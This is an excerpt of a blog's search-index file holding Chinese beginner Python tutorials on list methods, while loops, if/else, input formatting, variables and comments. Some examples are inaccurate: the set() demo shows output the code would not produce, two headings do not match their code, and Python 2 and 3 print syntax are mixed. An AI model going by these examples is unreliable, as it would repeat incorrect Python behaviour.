class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;aa&quot;,&quot;ss&quot;,&quot;dd&quot;,&quot;ff&quot;]</span><br><span class="line">c.append(&quot;gg&quot;)</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;aa&apos;, &apos;ss&apos;, &apos;dd&apos;, &apos;ff&apos;, &apos;gg&apos;]</span><br><span class="line">c.append([1,2,3])</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;aa&apos;, &apos;ss&apos;, &apos;dd&apos;, &apos;ff&apos;, &apos;gg&apos;, [1, 2, 3]]</span><br></pre></td></tr></table></figure><h3 id="extend-扩展"><a href="#extend-扩展" class="headerlink" title="extend() 扩展"></a>extend() 扩展</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;aa&quot;,&quot;ss&quot;,&quot;dd&quot;,&quot;ff&quot;]</span><br><span class="line">c.extend([1,2,3])</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;aa&apos;, &apos;ss&apos;, &apos;dd&apos;, &apos;ff&apos;, 1, 2, 3]</span><br></pre></td></tr></table></figure><h3 id="insert-插入到列表的指定位置"><a href="#insert-插入到列表的指定位置" class="headerlink" title="insert() 插入到列表的指定位置"></a>insert() 插入到列表的指定位置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;aa&quot;,&quot;ss&quot;,&quot;dd&quot;,&quot;ff&quot;]</span><br><span class="line">c.insert(1,123)</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;aa&apos;, 123, &apos;ss&apos;, &apos;dd&apos;, &apos;ff&apos;]</span><br></pre></td></tr></table></figure><h3 id="del-删除操作"><a href="#del-删除操作" class="headerlink" title="del[] 删除操作"></a>del[] 删除操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;aa&quot;,&quot;ss&quot;,&quot;dd&quot;,&quot;ff&quot;]</span><br><span class="line">del c[1]</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;aa&apos;, &apos;dd&apos;, &apos;ff&apos;]</span><br></pre></td></tr></table></figure><h3 id="set-去重"><a href="#set-去重" class="headerlink" title="set() 去重"></a>set() 去重</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;aa&quot;,&quot;ss&quot;,&quot;ss&quot;,&quot;dd&quot;,&quot;ff&quot;]</span><br><span class="line">set(c)</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;&#123;&apos;aa&apos;, &apos;dd&apos;, &apos;ff&apos;, &apos;ss&apos;&#125;</span><br></pre></td></tr></table></figure><h3 id="remove-移除列表中数据项的第一个匹配"><a href="#remove-移除列表中数据项的第一个匹配" class="headerlink" title="remove() 移除列表中数据项的第一个匹配"></a>remove() 移除列表中数据项的第一个匹配</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;aa&quot;,&quot;aa&quot;,&quot;ss&quot;,&quot;aa&quot;,&quot;dd&quot;,&quot;ff&quot;]</span><br><span class="line">c.remove(&quot;aa&quot;)</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;aa&apos;, &apos;ss&apos;, &apos;aa&apos;, &apos;dd&apos;, &apos;ff&apos;]</span><br></pre></td></tr></table></figure><h3 id="pop-方法"><a href="#pop-方法" class="headerlink" title="pop()方法"></a>pop()方法</h3><p>会溢出列表中的一个数据项，默认他会移除最后一个数据项，被输出这个数据项的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;aa&quot;,&quot;aa&quot;,&quot;ss&quot;,&quot;aa&quot;,&quot;dd&quot;,&quot;ff&quot;]</span><br><span class="line">c.pop()</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;aa&apos;, &apos;aa&apos;, &apos;ss&apos;, &apos;aa&apos;, &apos;dd&apos;]</span><br></pre></td></tr></table></figure><h3 id="count-列表的统计"><a href="#count-列表的统计" class="headerlink" title="count() 列表的统计"></a>count() 列表的统计</h3><p>count() 方法，统计列表内元素出现的次数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3,2,5,2]</span><br><span class="line">print c.count(2)</span><br><span class="line">&gt;&gt;3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,[1,2],3,[1,2],2,5,2]</span><br><span class="line">print c.count([1,2])</span><br><span class="line">&gt;&gt;2</span><br></pre></td></tr></table></figure><h3 id="sort-列表的排序"><a href="#sort-列表的排序" class="headerlink" title="sort() 列表的排序"></a>sort() 列表的排序</h3><p>sort() 方法，在列表原地修改进行排序操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,785,3,544,2,5,2]</span><br><span class="line">c.sort()</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[1, 2, 2, 2, 3, 5, 544, 785]</span><br></pre></td></tr></table></figure><h3 id="sorted-方法，保留原始数据，新建副本"><a href="#sorted-方法，保留原始数据，新建副本" class="headerlink" title="sorted() 方法，保留原始数据，新建副本"></a>sorted() 方法，保留原始数据，新建副本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,785,3,544,2,5,2]</span><br><span class="line">c2 = sorted(c)</span><br><span class="line">print c</span><br><span class="line">print c2</span><br></pre></td></tr></table></figure><h3 id="删除列表内所有数据"><a href="#删除列表内所有数据" class="headerlink" title="删除列表内所有数据"></a>删除列表内所有数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,785,3,544,2,5,2]</span><br><span class="line">del c[:]</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[]</span><br></pre></td></tr></table></figure><p>这里和del c不一样，这是删除c这个赋值。<br>reverse() 倒序反转的列表操作方法,这是在原来的数据基础上修改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,785,3,544,2,5,2]</span><br><span class="line">c.reverse()</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[2, 5, 2, 544, 3, 785, 2, 1]</span><br></pre></td></tr></table></figure><h3 id="reversed"><a href="#reversed" class="headerlink" title="reversed()"></a>reversed()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,785,3,544,2,5,2]</span><br><span class="line">c2 = reversed(c)</span><br><span class="line">print list(c2)</span><br><span class="line">&gt;&gt;[2, 5, 2, 544, 3, 785, 2, 1]</span><br></pre></td></tr></table></figure><h3 id="sorted-高级应用"><a href="#sorted-高级应用" class="headerlink" title="sorted() 高级应用"></a>sorted() 高级应用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [&quot;a&quot;,&quot;ss&quot;,&quot;ddd&quot;,&quot;ffff&quot;,&quot;ggggg&quot;]</span><br><span class="line">c.sort(key=len)</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[&apos;a&apos;, &apos;ss&apos;, &apos;ddd&apos;, &apos;ffff&apos;, &apos;ggggg&apos;]</span><br></pre></td></tr></table></figure><h3 id="sort-按照长度进行排序"><a href="#sort-按照长度进行排序" class="headerlink" title="sort() 按照长度进行排序"></a>sort() 按照长度进行排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,22,33,4444,78757]</span><br><span class="line">c.sort(reverse=True) #True Flase</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[78757, 4444, 33, 22, 1]</span><br></pre></td></tr></table></figure><p>反转之后进行排序。</p><h3 id="列表的成员关系"><a href="#列表的成员关系" class="headerlink" title="列表的成员关系"></a>列表的成员关系</h3><p>in 或者 not in ，判断元素是否在列表中，返回的类型是布尔类型bool True Flase</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = [1,22,33,&quot;4444&quot;,78757]</span><br><span class="line">print &quot;4444&quot; in c</span><br><span class="line">&gt;&gt;True</span><br></pre></td></tr></table></figure><p>判断字符串4444是否在列表中。</p><h3 id="index-列表下角标"><a href="#index-列表下角标" class="headerlink" title="index() 列表下角标"></a>index() 列表下角标</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;]</span><br><span class="line">name.index(&apos;a&apos;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python while</title>
      <link href="/article/python-while.html"/>
      <url>/article/python-while.html</url>
      
        <content type="html"><![CDATA[<h3 id="打印1-100"><a href="#打印1-100" class="headerlink" title="打印1-100"></a>打印1-100</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = 1     #赋值</span><br><span class="line"></span><br><span class="line">while i&lt;=100:       #如果条件成立，则循环</span><br><span class="line">    print(&quot;%d&quot;%i)   #print(i)</span><br><span class="line">    i = i+1         #重新赋值给i</span><br></pre></td></tr></table></figure><h3 id="打印矩形"><a href="#打印矩形" class="headerlink" title="打印矩形"></a>打印矩形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">i=1</span><br><span class="line">#用来控制行数</span><br><span class="line">while i&lt;=5:</span><br><span class="line"></span><br><span class="line">    #用来控制每一行中的列数</span><br><span class="line">    j = 1</span><br><span class="line">    while j&lt;=5:</span><br><span class="line">        print(&quot;*&quot;, end=&quot;&quot;)  #不换行</span><br><span class="line">        #j = j+1#c语言中向让j加上1的方式: j++;    ++j;   j+=1;  j=j+1;</span><br><span class="line">        j+=1</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    i = i+1</span><br></pre></td></tr></table></figure><h3 id="打印三角形"><a href="#打印三角形" class="headerlink" title="打印三角形"></a>打印三角形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">i = 1</span><br><span class="line"></span><br><span class="line">while i&lt;=5:</span><br><span class="line"></span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    #从键盘中输入一个值,这个值用来控制这行中*的个数</span><br><span class="line">    num = int(input(&quot;请输入这个行里的*的个数:&quot;))</span><br><span class="line">    </span><br><span class="line">    j = 1</span><br><span class="line">    while j&lt;=num:</span><br><span class="line">        print(&quot;*&quot;, end=&quot;&quot;)</span><br><span class="line">        j+=1</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    j = 1</span><br><span class="line">    while j&lt;=i:</span><br><span class="line">        print(&quot;*&quot;, end=&quot;&quot;)</span><br><span class="line">        j+=1</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    i+=1</span><br></pre></td></tr></table></figure><h3 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">i = 1</span><br><span class="line"></span><br><span class="line">while i&lt;=9:</span><br><span class="line"></span><br><span class="line">    j = 1</span><br><span class="line">    while j&lt;=i:</span><br><span class="line">        print(&quot;%d*%d=%d\t&quot;%(j,i,i*j), end=&quot;&quot;)</span><br><span class="line">        j+=1</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    i+=1</span><br></pre></td></tr></table></figure><h3 id="石头剪刀布游戏"><a href="#石头剪刀布游戏" class="headerlink" title="石头剪刀布游戏"></a>石头剪刀布游戏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">#1. 提示并获取用户的输入</span><br><span class="line">player = int(input(&quot;请输入 0剪刀 1石头 2布:&quot;))</span><br><span class="line"></span><br><span class="line">#2. 让电脑出一个</span><br><span class="line">computer = random.randint(0,2)</span><br><span class="line"></span><br><span class="line">#2. 判断用户的输入,然后显示对应的结果</span><br><span class="line">#if 玩家获胜的条件:</span><br><span class="line">if (player==0 and computer==2) or (player==1 and computer==0) or (player==2 and computer==1):</span><br><span class="line">    print(&quot;赢了,,,,可以去买奶粉了.....&quot;)</span><br><span class="line">#elif 玩家平局的条件:</span><br><span class="line">elif player==computer:</span><br><span class="line">    print(&quot;平局了,,,洗洗手决战到天亮....&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;输了,,,回家拿钱 再来....&quot;)</span><br></pre></td></tr></table></figure><h3 id="打印1-100之间的偶数"><a href="#打印1-100之间的偶数" class="headerlink" title="打印1-100之间的偶数"></a>打印1-100之间的偶数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i = 1</span><br><span class="line">while i&lt;=100:</span><br><span class="line">    #if i是个偶数:</span><br><span class="line">    if i%2==0:  #当i除以2余0</span><br><span class="line">        print(i)</span><br><span class="line">    i+=1</span><br></pre></td></tr></table></figure><h3 id="打印1-100之间的前20个偶数"><a href="#打印1-100之间的前20个偶数" class="headerlink" title="打印1-100之间的前20个偶数"></a>打印1-100之间的前20个偶数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">i = 1</span><br><span class="line">num = 0</span><br><span class="line">while i&lt;=100:</span><br><span class="line">    #if i是个偶数:</span><br><span class="line">    if i%2==0:</span><br><span class="line">        print(i)</span><br><span class="line">        num+=1</span><br><span class="line"></span><br><span class="line">    if num==20:</span><br><span class="line">        #break的作用 用来结束while循环,</span><br><span class="line">        #即 如果在while执行的过程中,不想循环了,可以用break来做到这个效果0:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    i+=1</span><br></pre></td></tr></table></figure><h3 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">i = 1</span><br><span class="line">while i&lt;=5:</span><br><span class="line"></span><br><span class="line">    print(&quot;-----&quot;)</span><br><span class="line"></span><br><span class="line">    if i==3:</span><br><span class="line">       break  #当条件满足，跳出循环</span><br><span class="line"></span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">    i+=1</span><br></pre></td></tr></table></figure><h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">break      结束while循环语句</span><br><span class="line">continue   跳出当前循环，但不结束整个while循环语句</span><br><span class="line">else while 循环中的一个else语句，正常结束while循环后要执行的代码</span><br><span class="line">else       不能与break合用，直接跳出就不是正常结束了。</span><br><span class="line">pass       什么也不做。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python if else</title>
      <link href="/article/python-if-esle.html"/>
      <url>/article/python-if-esle.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">age = input(&quot;请输入你的年龄:&quot;)   #input获取的所有数据,都当做字符串类型。过程：20---&gt;age--&gt;&quot;20&quot;</span><br><span class="line">age_num = int(age)               #讲输入的信息转换成整形,去除了双引号之后的值：20</span><br><span class="line"></span><br><span class="line">#if   如果年龄大于18:</span><br><span class="line">#else 否则执行下边的代码块</span><br><span class="line">if age_num&gt;18:</span><br><span class="line">    print(&quot;已成年,可以去网吧嗨皮.....&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;未成年,回家写作业吧......&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sex = input(&quot;请输入你的性别:&quot;)</span><br><span class="line"></span><br><span class="line">if sex == &quot;男&quot;:</span><br><span class="line">    print(&quot;你是男性,可以留胡子....&quot;)</span><br><span class="line">elif sex == &quot;女&quot;:</span><br><span class="line">    print(&quot;你是女性,可以留长头发....&quot;)</span><br><span class="line">#elif sex == &quot;中性&quot;:</span><br><span class="line">else:</span><br><span class="line">    print(&quot;你是第3中 性别,想干啥就干啥.....&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ticket = 1#1表示有车票  0表示没有车票</span><br><span class="line">knifeLenght = 48#cm</span><br><span class="line"></span><br><span class="line">#先判断是否有车票</span><br><span class="line">if ticket==1:</span><br><span class="line">    print(&quot;通过了车票的检测,进入到了车站,接下来要安检了&quot;)</span><br><span class="line"></span><br><span class="line">    #判断刀的长度是否合法</span><br><span class="line">    if knifeLenght&lt;=10:</span><br><span class="line">        print(&quot;通过了安检,进入到了候车厅&quot;)</span><br><span class="line">        print(&quot;马上就要见到TA了,很开心.....&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;安检没有通过,等待公安处理....&quot;)</span><br><span class="line">        </span><br><span class="line">else:</span><br><span class="line">    print(&quot;兄弟 你还没有买票了,先去买票 才能进站....&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sex = input(&quot;请输入你的性别:&quot;)</span><br><span class="line"></span><br><span class="line">#如果当前用户是男性的话,那么就输入判断女性的要求</span><br><span class="line">if sex==&quot;男&quot;:</span><br><span class="line">    color = input(&quot;你白么?&quot;) #白 或者 黄</span><br><span class="line">    money = int(input(&quot;请输入你的财产总和:&quot;)) #输入1000</span><br><span class="line">    beautiful = input(&quot;你美么?&quot;)#美 或者 普通</span><br><span class="line"></span><br><span class="line">    #if 白 并且 富 并且 美:</span><br><span class="line">    #if 白 and 富 and 美:</span><br><span class="line">    if color==&quot;白&quot; and money&gt;1000000 and beautiful==&quot;美&quot;:</span><br><span class="line">        print(&quot;白富美....&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;矮矬穷....&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;判断高富帅的信息在下面....&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python input %s 传参</title>
      <link href="/article/python-input.html"/>
      <url>/article/python-input.html</url>
      
        <content type="html"><![CDATA[<p>#获取用户输入的信息，赋值给hight<br>high = input(“请输入你的身高:”)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">#使用input获取必要的信息</span><br><span class="line">name = input(&quot;请输入名字:&quot;)</span><br><span class="line">QQ = input(&quot;请输入QQ:&quot;)</span><br><span class="line"></span><br><span class="line">#使用print来打印信息，并进行传参</span><br><span class="line">#字符串用%s，整型用%d</span><br><span class="line">print(&quot;=====================&quot;)</span><br><span class="line">print(&quot;姓名:%s&quot;%name)</span><br><span class="line">print(&quot;QQ:%s&quot;%QQ)</span><br><span class="line">print(&quot;=====================&quot;)</span><br></pre></td></tr></table></figure><p>输出多个符号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">#使用input获取必要的信息</span><br><span class="line">name = input(&quot;请输入名字:&quot;)</span><br><span class="line">QQ = input(&quot;请输入QQ:&quot;)</span><br><span class="line"></span><br><span class="line">#使用print来打印信息</span><br><span class="line">print(&quot;=&quot;*50)</span><br><span class="line">print(&quot;姓名:%s&quot;%name)</span><br><span class="line">print(&quot;QQ:%s&quot;%QQ)</span><br><span class="line">print(&quot;=&quot;*50)</span><br></pre></td></tr></table></figure><p>一次输出多个变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = &quot;laowang&quot;</span><br><span class="line">age = 20</span><br><span class="line">addr = &quot;山东.....&quot;</span><br><span class="line"></span><br><span class="line">print(&quot;姓名是:%s, 年龄是:%d,地址是:%s&quot;%(name, age, addr))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 定义变量</title>
      <link href="/article/python-variable.html"/>
      <url>/article/python-variable.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">score = 100        #定义了一个变量,这个变量的名字叫做score,它里面存储了一个数值 100</span><br><span class="line">high = 180         #单位是cm</span><br><span class="line"></span><br><span class="line">applePrice = 3.5   #苹果的价格 元/斤</span><br><span class="line">weight = 7.5       #购买的苹果的重量 斤</span><br><span class="line"></span><br><span class="line">money = applePrice * weight  #如果money=xxxx是第一次的话,那么就表示定义了一个变量</span><br><span class="line">money = money - 10           #如果 money=xxxx不是第一次出现,那么就不是定义变量,而是给这个已经存在的变量赋上一个新的值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 基础</title>
      <link href="/article/python-basics.html"/>
      <url>/article/python-basics.html</url>
      
        <content type="html"><![CDATA[<h3 id="声明编码"><a href="#声明编码" class="headerlink" title="声明编码"></a>声明编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br></pre></td></tr></table></figure><p>以下代码用来打印一个信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;hello world&quot;)</span><br></pre></td></tr></table></figure><p>#这里是单行注释</p><p>#井号是一个单行注释,提醒的内容不能换行,如果换了行,那么,需要在新的一行的行首添加一个#</p><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">print(&quot;hello world&quot;)</span><br><span class="line">print(&quot;hello world&quot;)</span><br><span class="line">print(&quot;hello world&quot;)</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure><p>或者双引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">print(&quot;hello world&quot;)</span><br><span class="line">print(&quot;hello world&quot;)</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 基础命令</title>
      <link href="/article/linux-command.html"/>
      <url>/article/linux-command.html</url>
      
